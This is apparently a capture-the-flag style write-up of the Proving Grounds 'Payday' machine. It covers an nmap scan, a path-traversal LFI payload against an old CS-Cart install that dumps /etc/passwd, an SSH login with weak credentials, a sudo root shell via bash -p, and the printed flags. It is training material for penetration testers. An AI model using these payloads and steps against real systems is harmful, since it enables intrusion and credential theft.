# Payday PG Labs

## Summary
Port 80 was hosting a vulnerable php app

A public Local File Inclusion vulnerability revelaed a user 'Patrick'

Ssh bruteforce showed a usable set of credentials in 'patrick:patrick'

Infinite sudo privileges were used to escalate privileges to root


## Nmap
The Payday Machine has been initiated with an nmap scan:
```sql
┌──(kali㉿kali)-[~/pglabs/payday]
└─$ nmap 192.168.180.39 | tee nmap                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 09:33 EST
Stats: 0:02:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.74% done; ETC: 09:37 (0:01:11 remaining)
Stats: 0:08:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 09:42 (0:00:00 remaining)
Nmap scan report for 192.168.180.39
Host is up (0.043s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 639.44 seconds

```
As that was taking a long time, I guessed port 80 could be open in the meantime, and explored it.

## Web Exploitation

Visiting the website at http://192.168.180.39/ showed an instance of the CS Cart software. The copyright string at the bottom of the page showed `Copyright © 2006 CS-Cart.com.`, which means it's
likely running a version of CS Cart from that year.

Running searchsploit outputted a lot of vulnerabilities
```sql
┌──(kali㉿kali)-[~]
└─$ searchsploit "cs-cart"
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CS-Cart - Multiple SQL Injections                                                                                                             | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                                                                                              | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                                                                                                             | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                                                                                           | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                                                                                            | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                                                                                                             | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                                                                                                         | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                                                                             | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                                                                                        | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                                                                                                  | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                                                                                                    | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection                                                                                                | php/webapps/40770.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

The file inclusion vulnerabilities seemed useful, as it could output potential usernames or give full code execution. Exploring the exploit files themselves showed that to exploit this File Inclusion vulnerability,
you visit this page: `http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[PATH]%00`.

Visting the page at `/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../../etc/passwd%00` gave me the contents of /etc/passwd:
```sql
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:game
s:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:1
0:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing Li
st Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexis
tent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:107:MySQL Server,,,:/var/lib/my
sql:/bin/false dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false postfix:x:105:112::/var/spool/postfix:/bin/false sshd:x:106:65534::/var/run/sshd:/usr/sbin/n
ologin patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
```

## Shell as patrick

Trying to ssh with the credentials `patrick:patrick` logs me in:
```sql
┌──(kali㉿kali)-[~/pglabs/payday]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa patrick@192.168.180.39
The authenticity of host '192.168.180.39 (192.168.180.39)' can't be established.
RSA key fingerprint is: SHA256:4cNPcDOXrXdUvuqlTmFzow0HNSvJ1pXoNPKTZViNTYA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.180.39' (RSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
patrick@192.168.180.39's password: 
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
patrick@payday:~$ id
uid=1000(patrick) gid=1000(patrick) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin),1000(patrick)
```

As it was an old server, the `-o HostKeyAlgorithms=+ssh-rsa` argument had to be used, because modern ssh clients don't allow rsa for encryption by themselves.

## Shell as root

Exploring the sudo privileges patrick has shows he can run any command as any user:
```sql
patrick@payday:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL



patrick@payday:~$ sudo /bin/bash -p
root@payday:~#
```

Running bash over sudo with the -p flag was used to obtain a root shell and not drop the root privileges.

## Flags
```sql
root@payday:~# cat /root/proof.txt
c7ee4275c73fcbaa77bd5d9deca7444d
root@payday:~# cat /home/patrick/local.txt
fa1ea6d52876393327ba57cd9647eab7

```
